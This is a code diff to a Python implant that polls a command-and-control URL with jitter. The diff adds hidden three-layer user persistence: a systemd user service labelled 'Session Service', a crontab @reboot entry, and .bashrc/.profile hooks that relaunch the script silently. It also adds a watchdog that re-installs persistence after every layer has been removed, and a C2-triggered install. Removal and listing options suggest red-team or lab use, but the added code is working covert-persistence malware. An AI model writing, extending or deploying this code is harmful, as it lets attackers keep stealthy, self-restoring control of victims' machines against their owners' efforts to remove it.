@@ -524,46 +524,175 @@ def run_task_exec(cmd):
 
 
 def persist_state(name=".shsvc"):
-    """Report + install user-level persistence via @reboot crontab."""
-    import shutil, subprocess
-    src = globals().get("__file__")
-    line = ""
+    """Report which user-level persistence mechanisms are active."""
+    import subprocess
+    active = []
     try:
         out = subprocess.run(["crontab", "-l"], capture_output=True, text=True)
-        for ln in (out.stdout or "").splitlines():
-            if name in ln:
-                line = ln
+        if name in (out.stdout or ""):
+            active.append("cron")
     except Exception:
         pass
-    return line
+    try:
+        out = subprocess.run(["systemctl", "--user", "is-enabled", name],
+                             capture_output=True, text=True)
+        if (out.stdout or "").strip() == "enabled":
+            active.append("systemd")
+    except Exception:
+        pass
+    prof = os.path.join(os.path.expanduser("~"), ".bashrc")
+    try:
+        if name in open(prof).read():
+            active.append("profile")
+    except Exception:
+        pass
+    return ",".join(active) if active else "none"
+
+
+def _staged_path(name=".shsvc"):
+    return os.path.join(os.path.expanduser("~"), ".local", "share", name + ".py")
 
 
 def persist_install(args, name=".shsvc"):
-    """Stage this script to ~/.local/share and add an @reboot crontab entry.
-    Only possible when running from a real file (not curl|exec delivery)."""
-    import shutil, subprocess, stat
+    """Stage + install layered user-level persistence (no root needed).
+
+    Layer 1: systemd user service with Restart=always (crash/heal, logout-proof
+             on systems with lingering; degrades gracefully elsewhere)
+    Layer 2: crontab @reboot
+    Layer 3: shell-profile hook (~/.bashrc + ~/.profile) -- always works,
+             re-arms on every interactive login
+    """
+    import shutil, subprocess
     src = globals().get("__file__")
     if not src or not os.path.isfile(src):
         return "persist: no source file (memory-delivered) -- pass --self-url"
     dst_dir = os.path.join(os.path.expanduser("~"), ".local", "share")
     os.makedirs(dst_dir, exist_ok=True)
-    dst = os.path.join(dst_dir, name + ".py")
+    dst = _staged_path(name)
     shutil.copy2(src, dst)
     os.chmod(dst, 0o700)
     loop = args.loop or 300
-    entry = "@reboot /usr/bin/env python3 %s --loop %d --jitter %d --c2 %s" % (
-        dst, loop, args.jitter or 60, args.c2)
-    if args.psk:
-        entry += " --psk '%s'" % args.psk.replace("'", "")
-    if args.auth:
-        entry += " --auth '%s'" % args.auth.replace("'", "")
+    jit = args.jitter or 60
+
+    def cmdline(path):
+        c2url = getattr(args, "c2", None) or "http://127.0.0.1:8443/gate"
+        c = "/usr/bin/env python3 %s --loop %d --jitter %d --c2 %s" % (
+            path, loop, jit, c2url)
+        if getattr(args, "psk", None):
+            c += " --psk '%s'" % args.psk.replace("'", "")
+        if getattr(args, "auth", None):
+            c += " --auth '%s'" % args.auth.replace("'", "")
+        return c
+
+    # ---- layer 1: systemd user service
+    systemd_ok = False
     try:
-        cur = subprocess.run(["crontab", "-l"], capture_output=True, text=True).stdout or ""
+        sd_dir = os.path.join(os.path.expanduser("~"), ".config",
+                              "systemd", "user")
+        os.makedirs(sd_dir, exist_ok=True)
+        svc = os.path.join(sd_dir, name + ".service")
+        with open(svc, "w") as f:
+            f.write(
+                "[Unit]\n"
+                "Description=Session Service\n"
+                "After=network-online.target\n\n"
+                "[Service]\n"
+                "Type=simple\n"
+                "ExecStart=%s\n"
+                "Restart=always\n"
+                "RestartSec=90\n\n"
+                "[Install]\n"
+                "WantedBy=default.target\n" % cmdline(dst))
+        r = subprocess.run(["systemctl", "--user", "daemon-reload"],
+                           capture_output=True, text=True)
+        r = subprocess.run(["systemctl", "--user", "enable", name],
+                           capture_output=True, text=True)
+        systemd_ok = r.returncode == 0
+        if systemd_ok:
+            subprocess.run(["systemctl", "--user", "start", name],
+                           capture_output=True, text=True)
+    except Exception:
+        systemd_ok = False
+
+    # ---- layer 2: crontab @reboot
+    cron_ok = False
+    try:
+        entry = "@reboot " + cmdline(dst)
+        cur = subprocess.run(["crontab", "-l"],
+                             capture_output=True, text=True).stdout or ""
         if name not in cur:
-            subprocess.run(["crontab", "-"], input=cur + entry + "\n", text=True, check=True)
-    except Exception as e:
-        return "persist: crontab failed (%s); staged at %s" % (e, dst)
-    return "persist: crontab @reboot -> %s" % dst
+            subprocess.run(["crontab", "-"], input=cur + entry + "\n",
+                           text=True, check=True)
+        cron_ok = True
+    except Exception:
+        cron_ok = False
+
+    # ---- layer 3: shell-profile hook (marker-guarded)
+    prof_ok = False
+    marker = "# %s" % name
+    hook = "%s\n[ -x %s ] && nohup %s >/dev/null 2>&1 &\n" % (
+        marker, dst, cmdline(dst))
+    for rc in (".bashrc", ".profile"):
+        p = os.path.join(os.path.expanduser("~"), rc)
+        try:
+            existing = open(p).read() if os.path.exists(p) else ""
+            if name not in existing:
+                with open(p, "a") as f:
+                    f.write("\n" + hook)
+            prof_ok = True
+        except Exception:
+            pass
+
+    if not (systemd_ok or cron_ok or prof_ok):
+        return "persist: all layers failed; staged at %s" % dst
+    return "persist: systemd=%s cron=%s profile=%s -> %s" % (
+        systemd_ok, cron_ok, prof_ok, dst)
+
+
+def persist_remove(name=".shsvc"):
+    """Reverse every persistence layer + delete the staged copy."""
+    import subprocess
+    out = []
+    try:
+        subprocess.run(["systemctl", "--user", "disable", "--now", name],
+                       capture_output=True, text=True)
+        svc = os.path.join(os.path.expanduser("~"), ".config",
+                           "systemd", "user", name + ".service")
+        if os.path.exists(svc):
+            os.remove(svc)
+            subprocess.run(["systemctl", "--user", "daemon-reload"],
+                           capture_output=True, text=True)
+        out.append("systemd")
+    except Exception:
+        pass
+    try:
+        cur = subprocess.run(["crontab", "-l"],
+                             capture_output=True, text=True).stdout or ""
+        lines = [ln for ln in cur.splitlines() if name not in ln]
+        subprocess.run(["crontab", "-"], input="\n".join(lines) + "\n",
+                       text=True)
+        out.append("cron")
+    except Exception:
+        pass
+    for rc in (".bashrc", ".profile"):
+        p = os.path.join(os.path.expanduser("~"), rc)
+        try:
+            if os.path.exists(p) and name in open(p).read():
+                lines = [ln for ln in open(p).read().splitlines()
+                         if name not in ln]
+                with open(p, "w") as f:
+                    f.write("\n".join(lines).rstrip() + "\n")
+                out.append(rc)
+        except Exception:
+            pass
+    try:
+        st = _staged_path(name)
+        if os.path.exists(st):
+            os.remove(st)
+        out.append("staged")
+    except Exception:
+        pass
+    return "removed:" + ",".join(out)
 
 
 # ---------------------------------------------------------------- main
@@ -627,7 +756,12 @@ def main():
     ap.add_argument("--cycles", type=int, default=0,
                     help="bound the loop for testing (0 = forever)")
     ap.add_argument("--persist", action="store_true",
-                    help="install @reboot crontab persistence (file delivery)")
+                    help="install layered user persistence "
+                         "(systemd user service / cron / profile)")
+    ap.add_argument("--persist-list", action="store_true",
+                    help="report active persistence mechanisms and exit")
+    ap.add_argument("--persist-remove", action="store_true",
+                    help="remove all persistence layers and exit")
     ap.add_argument("--selftest", action="store_true")
     ap.add_argument("-v", "--verbose", action="store_true")
     args = ap.parse_args()
@@ -638,6 +772,13 @@ def main():
         return 0
     if args.wait:
         time.sleep(args.wait / 1000.0)
+    if args.persist_list:
+        log("persistence: %s (staged: %s)",
+            persist_state(), _staged_path())
+        return 0
+    if args.persist_remove:
+        log("%s", persist_remove())
+        return 0
     if args.persist:
         log("%s", persist_install(args))
 
@@ -694,10 +835,14 @@ def main():
     burl += "&p=" + urllib.parse.quote(persist_state() or "none")
     extra = []
     cycle = 0
+    persist_wanted = bool(args.persist)
     while True:
         cycle += 1
         if args.cycles and cycle > args.cycles:
             return 0
+        # persistence watchdog: re-arm if every layer was removed
+        if persist_wanted and cycle % 10 == 1 and persist_state() == "none":
+            log("persist re-armed: %s", persist_install(args))
         sleep = max(1, args.loop + random.randint(-args.jitter, args.jitter))
         log("cycle %d done; sleeping %ds", cycle, sleep)
         time.sleep(sleep)
@@ -712,6 +857,7 @@ def main():
             if task.get("stages"):
                 args.only = str(task["stages"]).lower()
             if task.get("persist"):
+                persist_wanted = True
                 log("%s", persist_install(args))
                 burl = burl.split("&p=")[0] + "&p=" + urllib.parse.quote(
                     persist_state() or "installed")
